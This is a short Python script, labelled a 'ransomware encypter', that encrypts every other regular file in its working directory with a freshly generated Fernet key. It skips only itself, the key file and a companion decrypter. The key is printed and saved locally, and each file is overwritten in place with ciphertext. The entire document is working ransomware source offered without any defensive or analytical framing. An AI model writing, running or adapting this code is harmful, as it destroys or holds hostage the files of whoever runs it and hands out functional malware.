"""ransomware encypter."""
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (
        file == "ransomware_encypter.py"
        or file == "generate.key"
        or file == "ransomware_dencypter.py"
    ):
        continue

    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
print(key)

with open("generate.key", "wb") as keyfile:
    keyfile.write(key)

for file in files:
    with open(file, "rb") as open_file:
        clear_content = open_file.read()

    encrypt = Fernet(key).encrypt(clear_content)

    with open(file, "wb") as write_file:
        write_file.write(encrypt)
